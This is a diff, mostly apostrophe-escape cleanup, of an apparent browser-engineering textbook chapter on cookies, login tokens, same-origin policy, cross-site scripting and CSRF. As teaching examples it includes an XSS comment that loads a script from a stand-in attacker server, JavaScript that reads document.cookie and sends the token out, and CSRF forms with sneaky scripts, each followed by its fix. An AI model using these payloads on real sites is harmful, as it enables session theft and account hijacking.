@@ -5,19 +5,19 @@ prev: reflow
 next: advanced-rendering
 ...
 
-Our browser has grown up and now runs (small) web applications. Now
-let's take the final step and add user identity to our browser via
-cookies. Capability demands responsibility: our browser must then
-secure cookies against adversaries interested in getting at them.
+Our browser has grown up and now runs (small) web applications. Let's
+take the final step and add user identity to our browser via cookies.
+Capability demands responsibility: our browser must then secure
+cookies against adversaries interested in getting at them.
 
 ::: {.warning}
 Web browser security is a vast topic. It involves securing the web
 browser, securing the network, and securing the applications that the
 browser runs. It also involves educating the user, so that attackers
-can\'t misleading them into revealing their own secure data. This chapter
-can\'t cover all of that. Instead, it focuses on the mechanisms browsers
+can't misleading them into revealing their own secure data. This chapter
+can't cover all of that. Instead, it focuses on the mechanisms browsers
 have developed to protect the security of web applications. *So*, if
-you\'re writing security-sensitive code, this book is not enough.
+you're writing security-sensitive code, this book is not enough.
 :::
 
 Cookies
@@ -25,10 +25,10 @@ Cookies
 
 The most basic kind of user data on the web is the *cookie*. A
 cookie---the name is meaningless, ignore it---is a little bit of
-information stored by your browser on behalf of a web server. It\'s
+information stored by your browser on behalf of a web server. It's
 that information that allows the server to distinguish one web request
 from another. Bereft of cookies, your web browser is effectively
-anonymous:[^1] it isn\'t logged in anywhere so it can\'t do anything
+anonymous:[^1] it isn't logged in anywhere so it can't do anything
 useful.
 
 [^1]: I don't mean anonymous against malicious attackers, who might
@@ -36,7 +36,7 @@ useful.
     apart. I mean anonymous in the good-faith sense.
 
 
-Here\'s how cookies work. A web server, when it sends you an HTTP
+Here's how cookies work. A web server, when it sends you an HTTP
 response, can send a `Set-Cookie` header. This header contains a
 key-value pair, plus a bunch of parameters describing how long the
 cookie should be stored and who it should be shown to. For example, the
@@ -48,8 +48,8 @@ Set-Cookie: foo=bar; expires=Wed, 1 Jan 2020 00:00:00 GMT
 ```
 
 The expiration date is not mandatory, and there are other parameters you
-could add to a cookie, but for now let\'s focus just on the key-value
-pair involved. That\'s what your browser needs to remember: that `foo`
+could add to a cookie, but for now let's focus just on the key-value
+pair involved. That's what your browser needs to remember: that `foo`
 is `bar`. Every time it visits the server again it tells the server that
 `foo=bar` using the `Cookie` header:
 
@@ -62,10 +62,10 @@ To be clear, this `Cookie` header is reporting two cookies, with names
 the server.
 
 Let's implement cookies. We'll start storing cookies in our `Browser`;
-that database is traditionally called a *cookie jar*[^2] but I\'ll
+that database is traditionally called a *cookie jar*[^2] but I'll
 just call it `cookies`:
 
-[^2]: Because once you have one silly name it\'s important to stay
+[^2]: Because once you have one silly name it's important to stay
     on-brand.
 
 ``` {.python}
@@ -84,11 +84,11 @@ if "set-cookie" in headers:
     self.cookies[key] = value
 ```
 
-I\'m ignoring expiration and so on, and I\'m also ignoring the fact that
+I'm ignoring expiration and so on, and I'm also ignoring the fact that
 a server can actually send multiple `Set-Cookie` headers to set multiple
-cookies. It\'s a toy browser, people! I\'m also storing all the cookies,
-from all of the servers, in one place. This is stupid, but we\'ll fix it
-later, don\'t worry! For now, think of this as a one-server browser.
+cookies. It's a toy browser, people! I'm also storing all the cookies,
+from all of the servers, in one place. This is stupid, but we'll fix it
+later, don't worry! For now, think of this as a one-server browser.
 
 ::: {.todo}
 I've soured on this straw-man of implementing an insecure feature only
@@ -118,7 +118,7 @@ req_headers = { "Cookie": cookie_string[1:] }
 headers, body = request("GET", self.history[-1], headers=req_headers)
 ```
 
-Now let\'s add logins to our guest book using cookies.
+Now let's add logins to our guest book using cookies.
 
 A login system
 ==============
@@ -131,7 +131,7 @@ complex, just the minimal functionality:
 -   The server will hard-code a list of usernames/password pairs.
 -   The server will display who added which guest book entry.
 
-Let\'s start coding. First, we\'ll need to store usersnames in `ENTRIES`:[^3]
+Let's start coding. First, we'll need to store usersnames in `ENTRIES`:[^3]
 
 [^3]: The seed comments reference 1995's *Hackers*.
     [Hack the Planet!](https://xkcd.com/1337)
@@ -152,13 +152,13 @@ for entry, who in ENTRIES:
     out += '<p>' + entry + " <i>from " + who + '</i></p>'
 ```
 
-We\'ll also need a data structure to store usernames and passwords:
+We'll also need a data structure to store usernames and passwords:
 
 ``` {.python}
 LOGINS = { "crashoverride": "0cool", "cerealkiller": "emmanuel" }
 ```
 
-Next, let\'s add the `/login` URL:
+Next, let's add the `/login` URL:
 
 ``` {.python}
 def handle_request(method, url, headers, body):
@@ -183,7 +183,7 @@ implement the login logic directly in `handle_request`:
 
 [^4]: I've given the `password` input area the type `password`, which
     in a real browser will draw stars instead of showing what you've
-    entered, though our browser doesn\'t do that.
+    entered, though our browser doesn't do that.
 
 ``` {.python}
 username = None
@@ -193,7 +193,7 @@ if method == "post" and url == "/":
         username = params["username"]
 ```
 
-The `check_login` method does exactly what you\'d expect:
+The `check_login` method does exactly what you'd expect:
 
 ``` {.python}
 def check_login(username, pw):
@@ -219,7 +219,7 @@ if method == "post" and url = "/":
 return out, resp_headers
 ```
 
-We\'ll modify `handle_connection` to use the returned headers:
+We'll modify `handle_connection` to use the returned headers:
 
 ``` {.python}
 response, headers = handle_request(method, url, headers, body)
@@ -228,10 +228,10 @@ for header, value in headers.items():
     conx.send("{}: {}\r\n".format(header, value).encode('utf8'))
 ```
 
-Since we\'re now setting cookies we should also be reading them:[^6]
+Since we're now setting cookies we should also be reading them:[^6]
 
-[^6]: In reality there\'s also special syntax if you want an equal sign
-    in your cookie, but I\'m ignoring that.
+[^6]: In reality there's also special syntax if you want an equal sign
+    in your cookie, but I'm ignoring that.
 
 ``` {.python}
 def parse_cookies(s):
@@ -263,7 +263,7 @@ else:
 ```
 
 We now have two types of POST requests: one to post a new guest book
-entry and one to log in. We\'ll distinguish them by URL, so make sure
+entry and one to log in. We'll distinguish them by URL, so make sure
 that posting to the guest book uses the condition
 
 ``` {.python}
@@ -271,7 +271,7 @@ if method == "POST" and url == "/add":
     # ...
 ```
 
-Also, when you post to the guest book, we\'ll need to know your
+Also, when you post to the guest book, we'll need to know your
 username:
 
 ``` {.python}
@@ -279,7 +279,7 @@ if 'guest' in params and len(params['guest']) <= 100 and username:
     ENTRIES.append((params['guest'], username))
 ```
 
-We aren\'t showing the new guest book entry form to users who aren\'t
+We aren't showing the new guest book entry form to users who aren't
 logged in, but we still need to check `username` here, for the same
 reason that we need to check the length of entries on both the client
 and the server side: malicious users could construct their own POST
@@ -290,8 +290,8 @@ click the link to log in, use one of the username/password pairs
 above, and post entries.^[When debugging, the login flow is very slow.
 You might want to add the empty string as a username/password pair.]
 
-Of course, the code above has a whole slew of insecurities. It\'s hard
-to cover all of them,[^7] but let\'s cover three of the most glaring
+Of course, the code above has a whole slew of insecurities. It's hard
+to cover all of them,[^7] but let's cover three of the most glaring
 ones.
 
 [^7]: I should be hashing passwords! Using `bcrypt`! We should verify
@@ -302,8 +302,8 @@ ones.
 Changing your login
 ===================
 
-Right now, the cookie just stores your username. It\'s not hard to
-change! Let\'s go back to our browser and hard-code the cookie value:
+Right now, the cookie just stores your username. It's not hard to
+change! Let's go back to our browser and hard-code the cookie value:
 
 ``` {.python}
 self.cookies["username"] = "nameless"
@@ -316,17 +316,17 @@ browser, popping open the developer console and changing
 `document.cookie` is enough.] How absurdly insecure!
 
 The solution to this is to not store the username directly in the
-browser, where it can be changed by the user. Instead, let\'s store a
-\"login token\", a random value that is hard to guess, and have the
+browser, where it can be changed by the user. Instead, let's store a
+"login token", a random value that is hard to guess, and have the
 server remember which login token is for which username.
 
 This is actually standard practice not just for security reasons but
 also for functional ones. Generally speaking, cookie names and values
-must be pretty short, though there isn\'t a fixed limit across all
-browsers.[^8] So cookies don\'t usually store *data*; they store
+must be pretty short, though there isn't a fixed limit across all
+browsers.[^8] So cookies don't usually store *data*; they store
 *references* to data on the server, which can be as big as you want.
 
-Let\'s add login tokens in our guest book. I\'ll store the tokens in a
+Let's add login tokens in our guest book. I'll store the tokens in a
 global variable:
 
 ``` {.python}
@@ -334,7 +334,7 @@ import random
 TOKENS = {}
 ```
 
-Then where we set `Set-Cookie` we\'ll create a new token and remember
+Then where we set `Set-Cookie` we'll create a new token and remember
 its username:
 
 ``` {.python}
@@ -343,7 +343,7 @@ TOKENS[token] = username
 headers["Set-Cookie"] = "token=" + token
 ```
 
-Then when we read the `Cookie` header, we\'ll use the token to retrieve
+Then when we read the `Cookie` header, we'll use the token to retrieve
 the username:
 
 ``` {.python}
@@ -355,12 +355,12 @@ As long as the tokens are hard to guess,[^9] the only way to get one is
 from the server, and the server will only give you one with a valid
 login.
 
-[^9]: They\'re roughly-16-digit decimal numbers, so they have 53 bits
-    of randomness, which isn\'t great but isn\'t terrible (in real
+[^9]: They're roughly-16-digit decimal numbers, so they have 53 bits
+    of randomness, which isn't great but isn't terrible (in real
     code go for 256). But `random.random` is not a secure random
     number generator: observing enough tokens, an attacker could
-    predict future values and use those to hijack accounts. That\'s
-    one of the security exploits I\'m going to ignore here, even
+    predict future values and use those to hijack accounts. That's
+    one of the security exploits I'm going to ignore here, even
     though it is real and important.
 
 
@@ -373,16 +373,16 @@ sent to all other websites. This means that if you log in on our guest
 book, and then make a request to the `attack.evil` website, that website
 can see the token in the headers, record it, set its own browser cookie
 to your token, and then post as you on the guest book website. You see,
-cookies are web-site specific, but we\'re not storing them that way. It
+cookies are web-site specific, but we're not storing them that way. It
 goes beyond security---if you have two servers that both set the `token`
-cookie, they\'d overwrite each other and you\'d constantly be getting
+cookie, they'd overwrite each other and you'd constantly be getting
 logged out!
 
 Web browsers use the *same origin policy* to determine which cookies
 are sent where. The rule is: if a cookie is set on one origin---where
 the origin is the scheme, host, and port---it can only be sent to
-servers on the same origin. Let\'s update our cookie policy to do
-this. I\'ll change the `cookies` field so it stores a map from origins
+servers on the same origin. Let's update our cookie policy to do
+this. I'll change the `cookies` field so it stores a map from origins
 to key-value pairs:[^10]
 
 ``` {.python}
@@ -393,15 +393,15 @@ if "set-cookie" in headers:
 ```
 
 Then, when generating the `Cookie` header, instead of using
-`self.cookies.items()`, we\'ll use a `cookies` dictionary defined like this:
+`self.cookies.items()`, we'll use a `cookies` dictionary defined like this:
 
 ``` {.python}
 host, port, path = parse_url(self.history[-1])
 cookies = self.cookies.get((host, port), {})
 ```
 
-Now it\'s not quite so easy for a rogue web server to steal our cookies.
-It\'d have to be on the same origin, and that can\'t happen, because
+Now it's not quite so easy for a rogue web server to steal our cookies.
+It'd have to be on the same origin, and that can't happen, because
 this origin is already occupied up by *this* server.
 
 Right?
@@ -409,11 +409,11 @@ Right?
 Cross-site scripting
 ====================
 
-Sure, the origin is uniquely owned by our web server, so there\'s no way
+Sure, the origin is uniquely owned by our web server, so there's no way
 some other web server could see the headers the server and browser send
 to each other.[^11][^12][^13][^14]
 
-But that\'s not the only way to read cookies! In fact, cookies are
+But that's not the only way to read cookies! In fact, cookies are
 accessible from JavaScript as well, through the `document.cookie` field.
 This field is a string, containing the same contents as the `Cookie`
 header value. We can implement that pretty simply. First, in
@@ -445,7 +445,7 @@ class Browser:
 ```
 
 Accessing cookies from JavaScript may seem benign, since the JavaScript
-being run, in `comment.js`, is our own and won\'t do anything malicious.
+being run, in `comment.js`, is our own and won't do anything malicious.
 And this is true, if users are well-behaved. But consider the code we
 wrote to output guest book entries:
 
@@ -454,8 +454,8 @@ out += '<p>' + entry + ' <i> by ' + username + '</i></p>'
 ```
 
 Note that `entry` can be anything, anything the user might stick into
-our comment form. \"Anything\" might even include a user-written
-`<script>` tag! Let\'s imagine that you\'re logged in as one user, maybe
+our comment form. "Anything" might even include a user-written
+`<script>` tag! Let's imagine that you're logged in as one user, maybe
 `crashoverride`, but would like to gain access to another username,
 maybe `nameless`. You could post the comment:
 
@@ -465,7 +465,7 @@ Hi! <script src=http://my-server/evil.js></script>
 
 Our server would then output the HTML:[^15]
 
-[^15]: Yes, our form-encoding is very very limited, but it\'s
+[^15]: Yes, our form-encoding is very very limited, but it's
     similarly limited on both browser and server, so you could post
     the above comment using our browser. In a real server and browser
     this would also work, in a less accidental way.
@@ -483,16 +483,16 @@ That would cause our browser to download the `evil.js` script.[^16] So
     and origins, and they all run with the same permissions. This is
     important for shared libraries.
 
-Let\'s try it out. Post the above comment, except instead of
+Let's try it out. Post the above comment, except instead of
 `my-server` use `localhost:9000`, where we'll create a server with:
 
 ``` {.example}
 python3 -m http.server 9000
 ```
 
-That runs Python\'s built-in HTTP server on port 9000; it'll respond
+That runs Python's built-in HTTP server on port 9000; it'll respond
 to `localhost:9000/file` with the contents of `file` in the current
-directory. Let\'s fill `evil.js` with the following contents:
+directory. Let's fill `evil.js` with the following contents:
 
 ``` {.javascript}
 token = document.cookie.split("=")[1]
@@ -513,7 +513,7 @@ could better hide our evildoing:
 
 [^17]: They probably will, users aren't security experts.
 
-[^18]: Scripts aren\'t allowed to read data from XHRs to another
+[^18]: Scripts aren't allowed to read data from XHRs to another
     origin, but the browser still makes the request.
 
 
@@ -527,7 +527,7 @@ newform += "</form>"
 form.innerHTML= newform
 ```
 
-This replaces the contents of the comment form with a new form (so it\'s
+This replaces the contents of the comment form with a new form (so it's
 a form in a form, with the inner form taking priority) that submits both
 the new comments and the login token to our evil server.
 
@@ -539,9 +539,9 @@ kind of exploit is usually called *cross-site scripting*, shortened to
 XSS, though the data-misinterpreted-as-code issue is a fairly broad one
 that occurs in many, many systems.
 
-Anyway, whatever it\'s called, we need to fix it, and the way we do that
+Anyway, whatever it's called, we need to fix it, and the way we do that
 is not sending `entry`, the user comment, directly to the browser.
-Instead, we\'d do something to ensure the browser would not interpret it
+Instead, we'd do something to ensure the browser would not interpret it
 as code, something like:
 
 ``` {.python}
@@ -551,12 +551,12 @@ out += # ...
 
 Now the comment would would be printed as the code `&lt;script`, instead
 of as a literal script tag, so the browser will interpret it as text,
-not a tag.[^19] So we\'ve definitely fixed the problem of the browser
+not a tag.[^19] So we've definitely fixed the problem of the browser
 running code based on user comments. Success!
 
 I should add that there are other approaches to this bug. You could
 remove tags instead of escaping the angle bracket. You could prevent
-users from submitting comments with \"invalid characters\". You could do
+users from submitting comments with "invalid characters". You could do
 the character replacing before saving the entry, instead of before
 showing the entry. These are all worse than escaping:
 
@@ -566,9 +566,9 @@ showing the entry. These are all worse than escaping:
     client side. Plus, you might write too tight a filter and prevent
     users from sending something benign, like old-school heart emoticons
     `<3`.
--   Saving the character-replaced entry assumes you\'ll only consume the
-    entry in HTML; what if you later need to put it into JSON (you\'ll
-    need to escape single quotes), or raw JavaScript (you\'ll need to
+-   Saving the character-replaced entry assumes you'll only consume the
+    entry in HTML; what if you later need to put it into JSON (you'll
+    need to escape single quotes), or raw JavaScript (you'll need to
     escape `</script>`), or JSON embedded in JavaScript embedded in
     HTML. Data should be a single source of truth, not a place to store
     mangled HTML
@@ -581,14 +581,14 @@ Cross-site request forgery
 ==========================
 
 Thanks to the same-origin policy and the mitigations for cross-site
-scripting, it\'s now hard for an evil-doer to steal the login token
-from our browser. But that doesn\'t leave us totally safe. Another
+scripting, it's now hard for an evil-doer to steal the login token
+from our browser. But that doesn't leave us totally safe. Another
 concern is our browser misusing the token. One popular exploit of this
 type is called *cross-site request forgery*, often shortened to CSRF.
 
 In cross-site request forgery, the attack does not involve the user
 going to our guest book site at all. Instead, the user begins on our
-evil-doer\'s website.[^20] That website has a form analogous to the
+evil-doer's website.[^20] That website has a form analogous to the
 guest-book form:
 
 ``` {.html}
@@ -606,11 +606,11 @@ the guest-book. When the browser makes that POST request to the
 guest-book, it will *also* send along its guest-book cookie. Since the
 user has no idea where a form is going---the browser does not show
 them that information---they might want to sign a guest book on the
-evil-doer\'s site and end up signing the one on our server
+evil-doer's site and end up signing the one on our server
 instead.^[And thank goodness we never implemented a change-of-password
 form!]
 
-But it gets worse! Suppose the form isn\'t actually like that, and
+But it gets worse! Suppose the form isn't actually like that, and
 instead looks like this:
 
 ``` {.html}
@@ -620,7 +620,7 @@ instead looks like this:
 ```
 
 People will do all sorts of stuff, so they might click that button. And
-it may look safe, since there\'s no `guest` input area. However, there
+it may look safe, since there's no `guest` input area. However, there
 might be some sneaky JavaScript attached:
 
 ``` {.javascript}
@@ -636,33 +636,33 @@ This script waits for the user to click the button, and then replaces
 the form contents with a `guest` input area with a pre-filled value.
 The browser then finds it when it looks for input areas and submits
 our hard-coded guest-book entry to the guest-book server. And
-remember: the form is submitted by the user\'s browser, with the
-user\'s cookies, so the post will succeed (if the user is logged in to
+remember: the form is submitted by the user's browser, with the
+user's cookies, so the post will succeed (if the user is logged in to
 the guest book). Posting this sort of comment might not seem too scary
 (though shady advertisers will pay for it!) but imagine someone doing
 the same with a bank transaction.
 
 Try it! This should work in both ours and in a real browser. Plus, in a
-real browser you could also have a \"hidden\" input element, which would
-mean that you don\'t need to write any tricky JavaScript at all.
+real browser you could also have a "hidden" input element, which would
+mean that you don't need to write any tricky JavaScript at all.
 
 How do we defend against this attack?
 
 We want to make sure that every POST request to `/add` comes from a form
 on our website. The normal way to ensure that is to embed a secret
 value, called a *nonce*, into the form, and to reject form submissions
-that don\'t come with this secret value. The nonce is like a login
+that don't come with this secret value. The nonce is like a login
 token, but instead of getting it on login, you get a new one every time
-you\'re presented with a form to fill out.
+you're presented with a form to fill out.
 
-Let\'s implement nonces in our guest book. First, we\'ll generate our
+Let's implement nonces in our guest book. First, we'll generate our
 secret nonce:
 
 ``` {.python}
 nonce = str(random.random())[2:]
 ```
 
-Next, we\'ll add it to our form, like this:
+Next, we'll add it to our form, like this:
 
 ``` {.python}
 out += "<input name=nonce type=hidden value=" + nonce + ">"
@@ -670,13 +670,13 @@ out += "<input name=nonce type=hidden value=" + nonce + ">"
 
 The `hidden` input type basically instructs a browser not to render the
 input area, but to still submit it in the form. In our browser, which
-doesn\'t support hidden input elements, this will show up as an input
+doesn't support hidden input elements, this will show up as an input
 area with a random string of digits---not ideal, but as long as you
-don\'t touch it form submission will work fine.
+don't touch it form submission will work fine.
 
-We\'ll also need to save the nonce so that we can tell valid from
-invalid nonces. I\'m going to store that in a `NONCE` variable, which
-will store one nonce per user. We\'ll then check both that the nonce is
+We'll also need to save the nonce so that we can tell valid from
+invalid nonces. I'm going to store that in a `NONCE` variable, which
+will store one nonce per user. We'll then check both that the nonce is
 valid and also that it is associated with the correct user:[^22]
 
 ``` {.python}
@@ -692,16 +692,16 @@ if 'nonce' not in params or params['nonce'] != NONCES.get(username):
 
 Thanks to this change, in order to add an entry to the guest book, you
 need to be logged in and submit the form on the guest book page itself.
-And that\'s a form that we, as the guest book authors, have sole control
+And that's a form that we, as the guest book authors, have sole control
 over (thanks to our XSS mitigations), so the form submission has now
-been secured. Or... I keep saying there\'s more to security than what\'s
-in this book. Let\'s just settle for this fact: the guest book is now
+been secured. Or... I keep saying there's more to security than what's
+in this book. Let's just settle for this fact: the guest book is now
 more secure than before.
 
 ::: {.warning}
 The purpose of this book is to teach the *internals of web browsers*,
-not to teach web application security. There\'s much more you\'d want
-to do to make this guest book truly secure, let alone what we\'d need
+not to teach web application security. There's much more you'd want
+to do to make this guest book truly secure, let alone what we'd need
 to do to avoid denial of service attacks or to handle spam and
 malicious use.
 :::
@@ -709,7 +709,7 @@ malicious use.
 Summary
 =======
 
-We\'ve added user data, in the form of cookies, to our browser, and
+We've added user data, in the form of cookies, to our browser, and
 immediately had to bear the heavy burden of securing that data and
 ensuring it was not misused. We then saw the rich browser features we
 developed turn into attack vector. And we've made with some simple
@@ -719,8 +719,8 @@ vulnerabilities.
 Exercises
 =========
 
--   Add support for hidden input elements. Since they don\'t need to be
-    laid out, there\'s no need for a layout type at all!
+-   Add support for hidden input elements. Since they don't need to be
+    laid out, there's no need for a layout type at all!
 -   Add support for cookie expiration. Cookie expiration dates are set
     in the `Set-Cookie` header, and can be overwritten if the same
     cookie is set again with a later date. Save the same expiration
@@ -746,23 +746,23 @@ Exercises
 -   When your browser visits a web page, or when it loads a CSS or
     JavaScript file, it sends a `Referer` header[^24] containing the URL
     it is coming from. Sites often use this for analytics. However, for
-    some servers, the URL contains meaningful data that they don\'t want
+    some servers, the URL contains meaningful data that they don't want
     revealed to other websites. For these cases there is a
     `Referer-Policy` header, which can contain values like `no-referer`
     (never send the `Referer` header when leaving this page) or
     `same-origin` (only do so if navigating to another page on the same
-    origin). There are other values too, but let\'s ignore them.
+    origin). There are other values too, but let's ignore them.
     Implement both the `Referer` header and the `Referer-Policy` header,
     with those two values supported.
 
 [^8]: Also, cookies are sent back and forth on every request, and long
     cookies would mean a lot of useless traffic.
 
-[^10]: Our browser only supports one scheme, `http`, so I\'m not
+[^10]: Our browser only supports one scheme, `http`, so I'm not
     including that in the origin.
 
-[^11]: Well... Our connection isn\'t encrypted, so an attacker could
-    pick up the token from there. But another *server* couldn\'t.
+[^11]: Well... Our connection isn't encrypted, so an attacker could
+    pick up the token from there. But another *server* couldn't.
 
 [^12]: Well... Another server could hijack our DNS and redirect our
     hostname to a different IP address, and then steal our cookies. But
@@ -776,7 +776,7 @@ Exercises
 
 [^19]: In a real browser, that code will be displayed as a literal
     less-than sign followed by the word `script`, but in our browser,
-    this won\'t happen, unless you did the relevant exercise in [Chapter
+    this won't happen, unless you did the relevant exercise in [Chapter
     4](html.md).
 
 [^20]: Why? Perhaps it has some good content too, perhaps the site has
@@ -787,7 +787,7 @@ Exercises
 [^21]: For example, search forms that actually just direct you to a
     Google search.
 
-[^22]: You wouldn\'t want an attacker to take a nonce for *their*
+[^22]: You wouldn't want an attacker to take a nonce for *their*
     account and then use in a CSRF attack.
 
 [^23]: Should `microsoft.com` read `google.com`? What about
